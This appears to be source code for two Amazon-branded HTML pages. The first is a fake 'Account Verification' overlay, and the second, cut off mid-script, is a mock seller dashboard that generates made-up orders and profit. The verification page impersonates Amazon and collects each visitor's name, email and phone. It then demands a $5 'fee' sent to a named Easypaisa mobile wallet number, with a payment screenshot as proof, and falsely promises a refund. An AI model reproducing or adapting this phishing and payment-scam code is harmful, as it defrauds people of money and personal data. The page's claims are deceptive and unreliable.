<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Amazon Account Verification</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Amazon Ember:wght@300;400;500;700&display=swap">
  <style>
    :root {
      --amazon-orange: #FF9900;
      --amazon-dark: #131921;
      --amazon-darker: #0c1117;
      --amazon-darkest: #080b0f;
      --amazon-light: #FFFFFF;
      --amazon-gray: #232f3e;
      --amazon-light-gray: #37475A;
      --amazon-text: #F5F5F5;
      --amazon-text-light: #E1E1E1;
      --amazon-text-muted: #A7ACB2;
      --amazon-blue: #146EB4;
      --amazon-green: #00a67c;
      --amazon-red: #ff6b6b;
      --amazon-border: #3a4553;
      --amazon-gradient: linear-gradient(to right, #ff9900, #ff6b00);
    }

    body {
      font-family: 'Amazon Ember', Arial, sans-serif;
      background: var(--amazon-darkest);
      margin: 0;
      padding: 0;
      color: var(--amazon-text);
    }

    #verifyAd {
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0, 0, 0, 0.95);
      display: flex;
      align-items: center;
      justify-content: center;
      z-index: 99999;
      display: none;
    }

    .ad-content {
      background: var(--amazon-dark);
      border-radius: 16px;
      padding: 32px;
      width: 90%;
      max-width: 500px;
      box-shadow: 0 15px 30px rgba(0, 0, 0, 0.5);
      animation: fadeIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.1);
      border: 1px solid var(--amazon-border);
    }

    .amazon-header {
      display: flex;
      align-items: center;
      justify-content: center;
      margin-bottom: 25px;
    }

    .amazon-logo {
      height: 40px;
      filter: brightness(0.9);
    }

    .ad-content h2 {
      margin: 0 0 20px;
      font-size: 28px;
      font-weight: 700;
      color: var(--amazon-text);
      text-align: center;
      background: var(--amazon-gradient);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }

    .ad-content p {
      font-size: 15px;
      line-height: 1.6;
      margin-bottom: 20px;
      color: var(--amazon-text-light);
      text-align: center;
    }

    .form-group {
      margin-bottom: 24px;
    }

    .form-label {
      display: block;
      font-size: 15px;
      font-weight: 700;
      margin-bottom: 8px;
      color: var(--amazon-text);
    }

    .form-control {
      width: 100%;
      padding: 14px 16px;
      border-radius: 8px;
      border: 1px solid var(--amazon-border);
      font-size: 15px;
      height: 48px;
      background: var(--amazon-darker);
      color: var(--amazon-text);
      box-shadow: 0 1px 2px rgba(0,0,0,.1) inset;
      transition: all 0.2s ease;
    }

    .form-control:focus {
      border-color: var(--amazon-orange);
      box-shadow: 0 0 0 3px rgba(255, 153, 0, 0.2);
      outline: none;
      background: var(--amazon-gray);
    }

    .form-control::placeholder {
      color: var(--amazon-text-muted);
    }

    .btn {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      text-align: center;
      border: none;
      transition: all 0.2s ease;
      margin-top: 10px;
    }

    .btn-primary {
      background: var(--amazon-gradient);
      color: white;
      box-shadow: 0 4px 12px rgba(255, 153, 0, 0.3);
    }

    .btn-primary:hover {
      background: linear-gradient(to right, #ff8c00, #ff5500);
      transform: translateY(-2px);
      box-shadow: 0 6px 16px rgba(255, 153, 0, 0.4);
    }

    .btn-secondary {
      background: linear-gradient(to bottom, #37475A, #2b3848);
      border: 1px solid var(--amazon-border);
      color: var(--amazon-text);
    }

    .btn-secondary:hover {
      background: linear-gradient(to bottom, #2b3848, #1e2835);
    }

    .loading-container {
      text-align: center;
      padding: 30px 0;
    }

    .amazon-loader {
      width: 120px;
      height: 60px;
      margin: 0 auto 30px;
      position: relative;
    }

    .amazon-loader-box {
      width: 18px;
      height: 60px;
      background: var(--amazon-orange);
      display: inline-block;
      margin-right: 5px;
      animation: amazonLoader 1.5s infinite ease-in-out;
      border-radius: 4px;
    }

    .amazon-loader-box:nth-child(1) { animation-delay: -1.4s; }
    .amazon-loader-box:nth-child(2) { animation-delay: -1.2s; }
    .amazon-loader-box:nth-child(3) { animation-delay: -1.0s; }
    .amazon-loader-box:nth-child(4) { animation-delay: -0.8s; }
    .amazon-loader-box:nth-child(5) { animation-delay: -0.6s; }

    @keyframes amazonLoader {
      0%, 40%, 100% { transform: scaleY(0.5); opacity: 0.6; } 
      20% { transform: scaleY(1.0); opacity: 1; }
    }

    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .progress-container {
      margin: 30px 0;
    }

    .progress-bar {
      height: 10px;
      background-color: var(--amazon-gray);
      border-radius: 5px;
      overflow: hidden;
    }

    .progress-fill {
      height: 100%;
      background: var(--amazon-gradient);
      width: 0%;
      transition: width 0.6s ease;
    }

    .step-indicator {
      display: flex;
      justify-content: space-between;
      margin-top: 15px;
      font-size: 14px;
      color: var(--amazon-text-muted);
    }

    .step.active {
      color: var(--amazon-orange);
      font-weight: 700;
    }

    .hidden {
      display: none !important;
    }

    .verification-badge {
      color: var(--amazon-green);
      font-weight: 700;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 30px 0;
      font-size: 18px;
    }

    .verification-badge svg {
      margin-right: 12px;
      fill: var(--amazon-green);
    }

    .payment-details {
      background: var(--amazon-gray);
      padding: 20px;
      border-radius: 10px;
      margin: 25px 0;
      text-align: center;
      border: 1px solid var(--amazon-border);
    }

    .payment-details h3 {
      margin: 0;
      color: var(--amazon-orange);
      font-size: 20px;
      font-weight: 700;
    }

    .file-upload {
      border: 2px dashed var(--amazon-border);
      padding: 25px;
      border-radius: 10px;
      text-align: center;
      margin: 20px 0;
      cursor: pointer;
      transition: all 0.3s ease;
      background: var(--amazon-darker);
    }

    .file-upload:hover {
      border-color: var(--amazon-orange);
      background: rgba(255, 153, 0, 0.1);
    }

    .file-upload p {
      margin: 0;
      color: var(--amazon-text-light);
    }

    .file-upload i {
      font-size: 40px;
      color: var(--amazon-orange);
      margin-bottom: 10px;
      display: block;
    }

    .country-flag {
      width: 24px;
      height: 24px;
      margin-right: 10px;
      vertical-align: middle;
      border-radius: 50%;
      box-shadow: 0 2px 4px rgba(0,0,0,0.3);
    }

    .payment-method {
      display: flex;
      align-items: center;
      padding: 15px;
      background: var(--amazon-darker);
      border-radius: 8px;
      margin-bottom: 15px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
      border: 1px solid var(--amazon-border);
    }

    .payment-method img {
      width: 40px;
      height: 40px;
      margin-right: 15px;
      object-fit: contain;
      filter: brightness(0.9);
    }

    .payment-method-info {
      flex: 1;
    }

    .payment-method-name {
      font-weight: 700;
      margin-bottom: 5px;
      color: var(--amazon-text);
    }

    .payment-method-desc {
      font-size: 13px;
      color: var(--amazon-text-light);
    }

    .selected {
      border: 2px solid var(--amazon-orange);
      background: rgba(255, 153, 0, 0.1);
    }

    .security-badge {
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 20px 0;
      color: var(--amazon-blue);
      font-size: 14px;
    }

    .security-badge svg {
      margin-right: 8px;
      fill: var(--amazon-blue);
    }

    .detected-method {
      background: rgba(6, 125, 98, 0.15);
      padding: 15px;
      border-radius: 8px;
      margin: 20px 0;
      border: 1px solid var(--amazon-green);
      display: flex;
      align-items: center;
    }

    .detected-method img {
      width: 40px;
      height: 40px;
      margin-right: 15px;
      filter: brightness(0.9);
    }

    .detected-method-text {
      flex: 1;
      text-align: left;
    }

    .detected-method-title {
      font-weight: 700;
      color: var(--amazon-green);
      margin-bottom: 5px;
    }

    .detected-method-desc {
      font-size: 13px;
      color: var(--amazon-text-light);
    }
  </style>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</head>
<body>

<div id="verifyAd">
  <!-- STEP 1: Initial Verification Prompt -->
  <div class="ad-content" id="step1">
    <div class="amazon-header">
      <img class="amazon-logo" src="https://www.amazon.com/favicon.ico" alt="Amazon Logo">
    </div>
    <h2>Account Verification Required</h2>
    <p>To continue using your Amazon account, please complete identity verification as required by our updated security policy.</p>
    
    <div class="security-badge">
      <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24">
        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11V11.99z"/>
      </svg>
      <span>Secure Verification Process • 256-bit Encryption</span>
    </div>
    
    <div class="progress-container">
      <div class="progress-bar">
        <div class="progress-fill" style="width: 16.66%"></div>
      </div>
      <div class="step-indicator">
        <span>1 of 6</span>
        <span>Verification</span>
      </div>
    </div>
    <button class="btn btn-primary" onclick="startVerification()">Begin Verification</button>
  </div>

  <!-- STEP 2: Country Detection -->
  <div class="ad-content hidden" id="step2">
    <div class="amazon-header">
      <img class="amazon-logo" src="https://www.amazon.com/favicon.ico" alt="Amazon Logo">
    </div>
    <h2>Detecting Your Location</h2>
    
    <div class="loading-container">
      <div class="amazon-loader">
        <div class="amazon-loader-box"></div>
        <div class="amazon-loader-box"></div>
        <div class="amazon-loader-box"></div>
        <div class="amazon-loader-box"></div>
        <div class="amazon-loader-box"></div>
      </div>
      <p id="countryLoadingText">Identifying your country for localized payment options...</p>
    </div>
    
    <div class="progress-container">
      <div class="progress-bar">
        <div class="progress-fill" style="width: 33.33%"></div>
      </div>
      <div class="step-indicator">
        <span>2 of 6</span>
        <span>Location Detection</span>
      </div>
    </div>
  </div>

  <!-- STEP 3: Personal Information -->
  <div class="ad-content hidden" id="step3">
    <div class="amazon-header">
      <img class="amazon-logo" src="https://www.amazon.com/favicon.ico" alt="Amazon Logo">
    </div>
    <h2>Personal Information</h2>
    <p>Please provide the following information to verify your identity.</p>
    
    <div class="form-group">
      <label class="form-label" for="fullName">Full Legal Name</label>
      <input type="text" class="form-control" id="fullName" placeholder="As it appears on official documents">
    </div>
    
    <div class="form-group">
      <label class="form-label" for="email">Email Address</label>
      <input type="email" class="form-control" id="email" placeholder="Your Amazon account email">
    </div>
    
    <div class="form-group">
      <label class="form-label" for="phone">Phone Number</label>
      <input type="tel" class="form-control" id="phone" placeholder="With country code">
    </div>
    
    <div class="progress-container">
      <div class="progress-bar">
        <div class="progress-fill" style="width: 50%"></div>
      </div>
      <div class="step-indicator">
        <span>3 of 6</span>
        <span>Personal Information</span>
      </div>
    </div>
    
    <button class="btn btn-primary" onclick="submitPersonalInfo()">Continue</button>
  </div>

  <!-- STEP 4: Payment Method Detection -->
  <div class="ad-content hidden" id="step4">
    <div class="amazon-header">
      <img class="amazon-logo" src="https://www.amazon.com/favicon.ico" alt="Amazon Logo">
    </div>
    <h2>Finding Best Payment Method</h2>
    
    <div class="loading-container">
      <div class="amazon-loader">
        <div class="amazon-loader-box"></div>
        <div class="amazon-loader-box"></div>
        <div class="amazon-loader-box"></div>
        <div class="amazon-loader-box"></div>
        <div class="amazon-loader-box"></div>
      </div>
      <p id="paymentLoadingText">Analyzing payment options in your region...</p>
      <div id="detectedMethodContainer" style="display: none;">
        <div class="detected-method">
          <img src="https://ucarecdn.com/adc86d16-04f7-4912-9e6f-4245c8666410/images1.png" alt="Easypaisa">
          <div class="detected-method-text">
            <div class="detected-method-title">Easypaisa detected</div>
            <div class="detected-method-desc">Best payment method for your region</div>
          </div>
          <i class="fas fa-check-circle" style="color: var(--amazon-green); font-size: 20px;"></i>
        </div>
      </div>
    </div>
    
    <div class="progress-container">
      <div class="progress-bar">
        <div class="progress-fill" style="width: 66.66%"></div>
      </div>
      <div class="step-indicator">
        <span>4 of 6</span>
        <span>Payment Detection</span>
      </div>
    </div>
  </div>

  <!-- STEP 5: Payment Verification -->
  <div class="ad-content hidden" id="step5">
    <div class="amazon-header">
      <img class="amazon-logo" src="https://www.amazon.com/favicon.ico" alt="Amazon Logo">
    </div>
    <h2>Payment Verification</h2>
    
    <p>To complete your account verification, please send a <strong>$5 verification fee</strong> using the following method:</p>
    
    <div id="paymentMethods">
      <!-- Payment method will be dynamically inserted here -->
    </div>
    
    <p>This one-time fee helps prevent fraudulent accounts and will be refunded to your Amazon account balance after verification.</p>
    
    <div class="form-group">
      <label class="form-label" for="screenshot">Upload Payment Proof</label>
      <div class="file-upload" onclick="document.getElementById('screenshot').click()">
        <i class="fas fa-cloud-upload-alt"></i>
        <p>Click to upload screenshot of payment confirmation</p>
      </div>
      <input type="file" id="screenshot" accept="image/*" style="display: none;">
    </div>
    
    <div class="progress-container">
      <div class="progress-bar">
        <div class="progress-fill" style="width: 83.33%"></div>
      </div>
      <div class="step-indicator">
        <span>5 of 6</span>
        <span>Payment</span>
      </div>
    </div>
    
    <button class="btn btn-primary" onclick="uploadProof()">Submit Payment Proof</button>
  </div>

  <!-- STEP 6: Verification Complete (Permanent) -->
  <div class="ad-content hidden" id="step6">
    <div class="amazon-header">
      <img class="amazon-logo" src="https://www.amazon.com/favicon.ico" alt="Amazon Logo">
    </div>
    <h2>Verification Complete</h2>
    
    <div class="verification-badge">
      <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24">
        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
      </svg>
      <span>Your account has been successfully verified</span>
    </div>
    
    <p>Your $5 verification fee will be refunded to your Amazon account balance within 24 hours.</p>
    <p>Thank you for helping us maintain a secure marketplace.</p>
    
    <div class="progress-container">
      <div class="progress-bar">
        <div class="progress-fill" style="width: 100%"></div>
      </div>
      <div class="step-indicator">
        <span>6 of 6</span>
        <span>Complete</span>
      </div>
    </div>
    
    <button class="btn btn-primary" onclick="location.reload()">Continue to Amazon</button>
  </div>
</div>

<script>
  // Permanent verification system
  const verificationKey = 'amazonVerificationCompleted';
  const firstVisitKey = 'amazonFirstVisit';
  const showAdAfter = 7* 24 * 60 * 60 * 1000; // 5 days in milliseconds
  let detectedCountry = 'PK'; // Always Pakistan
  let selectedPaymentMethod = null;

  // Payment method for Pakistan
  const paymentMethod = {
    name: 'Easypaisa',
    number: '0349 4067281',
    icon: 'https://ucarecdn.com/adc86d16-04f7-4912-9e6f-4245c8666410/images1.png'
  };

  function checkAdDisplay() {
    // If verification was completed, show final step permanently
    if (localStorage.getItem(verificationKey)) {
      showStep('step6');
      return;
    }

    const now = Date.now();
    const firstVisit = localStorage.getItem(firstVisitKey);

    if (!firstVisit) {
      localStorage.setItem(firstVisitKey, now.toString());
    } else if (now - parseInt(firstVisit) >= showAdAfter) {
      document.getElementById('verifyAd').style.display = 'flex';
      localStorage.setItem('amazonVerificationShown', 'true'); // Permanent
    }
    
    // If ad was shown before, keep showing it
    if (localStorage.getItem('amazonVerificationShown')) {
      document.getElementById('verifyAd').style.display = 'flex';
    }
  }

  function showStep(stepId) {
    document.querySelectorAll('.ad-content').forEach(el => {
      el.classList.add('hidden');
    });
    document.getElementById(stepId).classList.remove('hidden');
    document.getElementById('verifyAd').style.display = 'flex'; // Always stays visible
    
    // Special handling for certain steps
    if (stepId === 'step2') {
      startCountryDetection();
    } else if (stepId === 'step4') {
      startPaymentDetection();
    } else if (stepId === 'step5') {
      showPaymentMethod();
    }
  }

  function startVerification() {
    showStep('step2');
  }

  function submitPersonalInfo() {
    const fullName = document.getElementById('fullName').value;
    const email = document.getElementById('email').value;
    const phone = document.getElementById('phone').value;
    
    if (!fullName || !email || !phone) {
      alert('Please fill in all required fields');
      return;
    }
    
    // Store data permanently
    localStorage.setItem('amazonUserData', JSON.stringify({
      fullName,
      email,
      phone,
      collectedAt: new Date().toISOString()
    }));
    
    showStep('step4');
  }

  function startCountryDetection() {
    const loadingText = document.getElementById('countryLoadingText');
    
    // Immediately show Pakistan as detected
    setTimeout(() => {
      loadingText.innerHTML = `<img src="https://flagcdn.com/24x18/pk.png" class="country-flag"> Pakistan detected as your country`;
    }, 2000);
    
    // After 3 seconds, move to personal info
    setTimeout(() => {
      detectedCountry = 'PK'; // Always detect Pakistan
      showStep('step3');
    }, 10000);
  }

  function startPaymentDetection() {
    const loadingText = document.getElementById('paymentLoadingText');
    const detectedMethodContainer = document.getElementById('detectedMethodContainer');
    
    // After 15 seconds (half of 30), show Easypaisa as detected
    setTimeout(() => {
      loadingText.style.display = 'none';
      detectedMethodContainer.style.display = 'block';
    }, 15000);
    
    // After total 30 seconds, proceed to payment
    setTimeout(() => {
      showStep('step5');
    }, 30000);
  }

  function showPaymentMethod() {
    const container = document.getElementById('paymentMethods');
    container.innerHTML = '';
    
    const methodElement = document.createElement('div');
    methodElement.className = 'payment-method selected';
    
    methodElement.innerHTML = `
      <img src="${paymentMethod.icon}" alt="${paymentMethod.name}">
      <div class="payment-method-info">
        <div class="payment-method-name">${paymentMethod.name}</div>
        <div class="payment-method-desc">Send $5(In PKR:1412 ) to: ${paymentMethod.number}</div>
      </div>
      <i class="fas fa-check-circle" style="color: var(--amazon-green); font-size: 20px;"></i>
    `;
    
    container.appendChild(methodElement);
    selectedPaymentMethod = paymentMethod;
  }

  function uploadProof() {
    if (!selectedPaymentMethod) {
      alert("Please select a payment method first.");
      return;
    }

    const fileInput = document.getElementById('screenshot');
    if (!fileInput.files.length) {
      alert("Please upload a screenshot of your payment.");
      return;
    }

    // Store payment proof permanently
    const file = fileInput.files[0];
    const reader = new FileReader();
    reader.onload = function(e) {
      localStorage.setItem('amazonPaymentProof', JSON.stringify({
        fileName: file.name,
        fileType: file.type,
        fileSize: file.size,
        uploadedAt: new Date().toISOString(),
        paymentMethod: selectedPaymentMethod.name,
        paymentNumber: selectedPaymentMethod.number
      }));
    };
    reader.readAsDataURL(file);

    // Show loading for 2 seconds before completion
    setTimeout(() => {
      // Mark verification as complete (permanent)
      localStorage.setItem(verificationKey, 'true');
      showStep('step6');
    }, 2000);
  }

  // Initialize
  window.onload = function() {
    checkAdDisplay();
    
    // If verification was completed, show final step forever
    if (localStorage.getItem(verificationKey)) {
      showStep('step6');
    }
  };
</script>

</body>
</html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon  Seller Account</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --amazon-orange: #FF9900;
            --amazon-dark: #131A22;
            --amazon-darker: #0F141A;
            --amazon-light: #37475A;
            --amazon-lighter: #232F3E;
            --amazon-text: #E1E1E1;
            --amazon-text-light: #FFFFFF;
            --amazon-border: #3D4A5C;
            --amazon-card-bg: #1A222C;
            --success-green: #00BFA5;
            --warning-yellow: #FFB74D;
            --error-red: #E57373;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Amazon Ember', Arial, sans-serif;
        }

        body {
            background-color: var(--amazon-dark);
            color: var(--amazon-text);
            font-size: 14px;
            padding-bottom: 50px;
        }

        /* Bottom Navigation */
        .bottom-nav {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: var(--amazon-darker);
            height: 50px;
            display: flex;
            align-items: center;
            justify-content: space-around;
            border-top: 1px solid var(--amazon-border);
            z-index: 1000;
        }

        .nav-button {
            color: var(--amazon-text-light);
            text-decoration: none;
            display: flex;
            flex-direction: column;
            align-items: center;
            font-size: 10px;
            padding: 5px;
            flex: 1;
            text-align: center;
        }

        .nav-button.active {
            color: var(--amazon-orange);
        }

        .nav-button i {
            font-size: 18px;
            margin-bottom: 3px;
        }

        .sticker {
            background-color: var(--amazon-orange);
            color: #111;
            font-size: 9px;
            padding: 1px 3px;
            border-radius: 10px;
            position: absolute;
            top: 3px;
            right: 20%;
        }

        .button-container {
            position: relative;
            display: inline-block;
        }

        /* Main Content */
        .main-content {
            padding: 15px;
        }

        /* Dashboard Header */
        .dashboard-header {
            margin-bottom: 15px;
        }

        .dashboard-title h1 {
            font-size: 20px;
            color: var(--amazon-text-light);
            margin-bottom: 5px;
        }

        .dashboard-title p {
            color: var(--amazon-text);
            font-size: 12px;
        }

        .dashboard-actions {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }

        .btn {
            padding: 8px 12px;
            border-radius: 3px;
            border: 1px solid var(--amazon-border);
            background-color: var(--amazon-card-bg);
            cursor: pointer;
            font-size: 12px;
            color: var(--amazon-text);
            flex: 1;
        }

        .btn-primary {
            background-color: var(--amazon-orange);
            border-color: var(--amazon-orange);
            color: #111;
        }

        /* Sales Summary Section */
        .sales-summary {
            background-color: var(--amazon-card-bg);
            border-radius: 4px;
            padding: 12px;
            border: 1px solid var(--amazon-border);
            margin-bottom: 15px;
        }

        .sales-header {
            margin-bottom: 12px;
        }

        .sales-title {
            font-weight: bold;
            color: var(--amazon-text-light);
            font-size: 14px;
        }

        /* Metrics Grid */
        .metrics-grid {
            display: grid;
            grid-template-columns: 1fr;
            gap: 10px;
            margin-bottom: 15px;
        }

        .metric-card {
            background-color: var(--amazon-card-bg);
            border-radius: 4px;
            padding: 12px;
            border: 1px solid var(--amazon-border);
        }

        .metric-title {
            color: var(--amazon-text);
            font-size: 12px;
            margin-bottom: 8px;
        }

        .metric-value {
            font-size: 20px;
            font-weight: bold;
            margin-bottom: 5px;
            color: var(--amazon-text-light);
        }

        .metric-change {
            font-size: 11px;
        }

        .metric-change.positive {
            color: var(--success-green);
        }

        .metric-change.negative {
            color: #FF6B6B;
        }

        /* Orders Page */
        .orders-page {
            display: none;
        }

        .orders-container {
            background-color: var(--amazon-card-bg);
            border-radius: 4px;
            border: 1px solid var(--amazon-border);
            overflow-x: auto;
            margin-bottom: 20px;
        }

        .orders-header {
            padding: 12px;
            border-bottom: 1px solid var(--amazon-border);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .orders-title {
            font-weight: bold;
            color: var(--amazon-text-light);
            font-size: 14px;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            min-width: 600px;
        }

        th, td {
            padding: 10px 12px;
            text-align: left;
            border-bottom: 1px solid var(--amazon-border);
            font-size: 12px;
        }

        th {
            background-color: var(--amazon-darker);
            color: var(--amazon-text);
            font-weight: normal;
        }

        .order-status {
            padding: 3px 6px;
            border-radius: 3px;
            font-size: 11px;
            display: inline-block;
        }

        .status-pending {
            background-color: #42310E;
            color: #FFB74D;
        }

        .status-shipped {
            background-color: #0D3A58;
            color: #64B5F6;
        }

        .status-delivered {
            background-color: #1A4331;
            color: #81C784;
        }

        .status-cancelled {
            background-color: #4A1C29;
            color: #E57373;
        }

        .pagination {
            display: flex;
            justify-content: center;
            padding: 12px;
            font-size: 12px;
        }

        /* Order Detail Modal */
        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: rgba(0,0,0,0.7);
            z-index: 2000;
            align-items: center;
            justify-content: center;
        }

        .modal-content {
            background-color: var(--amazon-card-bg);
            border-radius: 4px;
            padding: 20px;
            width: 90%;
            max-width: 400px;
            border: 1px solid var(--amazon-border);
        }

        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
        }

        .modal-title {
            font-size: 18px;
            color: var(--amazon-text-light);
        }

        .close-modal {
            background: none;
            border: none;
            color: var(--amazon-text);
            font-size: 20px;
            cursor: pointer;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            margin-bottom: 5px;
            color: var(--amazon-text);
            font-size: 13px;
        }

        .form-group input, .form-group select {
            width: 100%;
            padding: 8px 10px;
            border-radius: 3px;
            border: 1px solid var(--amazon-border);
            background-color: var(--amazon-dark);
            color: var(--amazon-text);
        }

        .modal-actions {
            display: flex;
            justify-content: flex-end;
            gap: 10px;
            margin-top: 20px;
        }

        /* Notification */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background-color: var(--success-green);
            color: white;
            padding: 10px 15px;
            border-radius: 4px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.2);
            display: none;
            z-index: 3000;
            max-width: 300px;
        }

        .notification.warning {
            background-color: var(--warning-yellow);
            color: #111;
        }

        .notification.error {
            background-color: var(--error-red);
        }

        /* Top Logo Bar */
        .top-logo {
            background-color: var(--amazon-darker);
            height: 50px;
            display: flex;
            align-items: center;
            padding: 0 15px;
            justify-content: space-between;
            border-bottom: 1px solid var(--amazon-border);
        }

        .logo {
            color: var(--amazon-text-light);
            font-size: 18px;
            font-weight: bold;
            display: flex;
            align-items: center;
        }

        .logo img {
            height: 30px;
            margin-right: 8px;
        }

        .user-menu {
            display: flex;
            align-items: center;
        }

        .user-menu img {
            width: 30px;
            height: 30px;
            border-radius: 50%;
        }

        /* Chart canvas */
        #sales-chart {
            height: 250px;
        }

        /* Dashboard Page */
        .dashboard-page {
            display: block;
        }
    </style>
</head>
<body>
    <!-- Top Logo Only -->
    <div class="top-logo">
        <div class="logo">
            <img src="https://sellercentral.amazon.com/favicon.ico" alt="Amazon Seller">
            <span>Amazon Seller</span>
        </div>
        <div class="user-menu">
            <img src="https://ucarecdn.com/7e71d009-2fda-43a0-bc3f-ba3a4735bce9/images8.jpeg" alt="User">
        </div>
    </div>

    <!-- Dashboard Page -->
    <div class="main-content dashboard-page">
        <div class="dashboard-header">
            <div class="dashboard-title">
                <h1>  Amazon Seller Account </h1>
                <p>Summary of your selling activity</p>
            </div>
            <div class="dashboard-actions">
                <button class="btn">Reports</button>
                <button class="btn btn-primary">Add Product</button>
            </div>
        </div>

        <!-- Sales Summary Section -->
        <div class="sales-summary">
            <div class="sales-header">
                <div class="sales-title">Sales Summary (Last 30 Days)</div>
            </div>
            <div id="sales-chart">
                <canvas id="amazonChart"></canvas>
            </div>
        </div>

        <!-- Metrics Grid -->
        <div class="metrics-grid">
            <div class="metric-card">
                <div class="metric-title">Orders (24 hrs)</div>
                <div class="metric-value" id="orders-count">0</div>
                <div class="metric-change positive">↑ 0% from yesterday</div>
            </div>
            <div class="metric-card">
                <div class="metric-title">Ordered Revenue</div>
                <div class="metric-value" id="total-revenue">$0</div>
                <div class="metric-change positive">↑ 0% from yesterday</div>
            </div>
            <div class="metric-card">
                <div class="metric-title">Conversion Rate</div>
                <div class="metric-value">0%</div>
                <div class="metric-change negative">↓ 0% from yesterday</div>
            </div>
            <div class="metric-card">
                <div class="metric-title">Buyer Messages</div>
                <div class="metric-value">0</div>
                <div class="metric-change positive">↑ 0 new</div>
            </div>
        </div>

        <!-- Recent Orders -->
        <div class="orders-container">
            <div class="orders-header">
                <div class="orders-title">Recent Orders</div>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>Order ID</th>
                        <th>Date</th>
                        <th>Buyer</th>
                        <th>Status</th>
                        <th>Total</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody id="recent-orders">
                    <!-- Orders will be added dynamically -->
                </tbody>
            </table>
            <div class="pagination">
                <button>Previous</button>
                <button class="active">1</button>
                <button>2</button>
                <button>Next</button>
            </div>
        </div>
    </div>

    <!-- Orders Page -->
    <div class="main-content orders-page">
        <div class="orders-header">
            <h1>Order Management</h1>
        </div>
        
        <div class="orders-container">
            <div class="orders-header">
                <div class="orders-title">All Orders</div>
                <button class="btn">Filter</button>
            </div>
            <table>
                <thead>
                    <tr>
                        <th>Order ID</th>
                        <th>Product</th>
                        <th>Date</th>
                        <th>Buyer</th>
                        <th>Status</th>
                        <th>Total</th>
                        <th>Action</th>
                    </tr>
                </thead>
                <tbody id="all-orders">
                    <!-- Orders will be added dynamically -->
                </tbody>
            </table>
            <div class="pagination">
                <button>Previous</button>
                <button class="active">1</button>
                <button>2</button>
                <button>Next</button>
            </div>
        </div>
    </div>

    <!-- Order Detail Modal -->
    <div class="modal" id="order-modal">
        <div class="modal-content">
            <div class="modal-header">
                <h3 class="modal-title">Order Details</h3>
                <button class="close-modal">&times;</button>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label>Seller Location</label>
                    <input type="text" id="seller-location" placeholder="Enter seller location">
                </div>
                <div class="form-group">
                    <label>Package ID</label>
                    <input type="text" id="package-id" placeholder="Enter package ID">
                </div>
                <div class="form-group">
                    <label>Order ID</label>
                    <input type="text" id="order-id" readonly>
                </div>
                <div class="form-group">
                    <label>Track ID</label>
                    <input type="text" id="track-id" placeholder="Enter track ID">
                </div>
                <div class="form-group">
                    <label>Profit ($)</label>
                    <input type="number" id="profit" placeholder="Enter profit amount" min="1" max="5" step="0.01">
                </div>
            </div>
            <div class="modal-actions">
                <button class="btn close-modal">Cancel</button>
                <button class="btn btn-primary" id="submit-order">Submit</button>
            </div>
        </div>
    </div>

    <!-- Notification -->
    <div class="notification" id="notification">
        Profit of $<span id="profit-amount">0</span> has been added to your dashboard!
    </div>

    <!-- Bottom Navigation -->
    <div class="bottom-nav">
        <a href="#" class="nav-button active" id="home-btn">
            <i class="fas fa-home"></i>
            <span>Home</span>
        </a>
        <a href="#" class="nav-button" id="orders-btn">
            <div class="button-container">
                <i class="fas fa-shopping-cart"></i>
                <span class="sticker" id="orders-badge">0</span>
            </div>
            <span>Orders</span>
        </a>
        <a href="#" class="nav-button">
            <i class="fas fa-tag"></i>
            <span>Listing</span>
        </a>
        <a href="#" class="nav-button">
            <div class="button-container">
                <i class="fas fa-boxes"></i>
                <span class="sticker">5</span>
            </div>
            <span>Inventory</span>
        </a>
        <a href="#" class="nav-button">
            <i class="fas fa-bars"></i>
            <span>Menu</span>
        </a>
    </div>

    <!-- Chart.js for the chart -->
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script>
        // Global variables
        let totalRevenue = 0;
        let totalOrders = 0;
        let pendingOrders = [];
        let completedOrders = [];
        let orderInterval;
        let currentOrderId = 1000;
        let amazonChart;
        let lastOrderGenerationTime = 0;

        // DOM elements
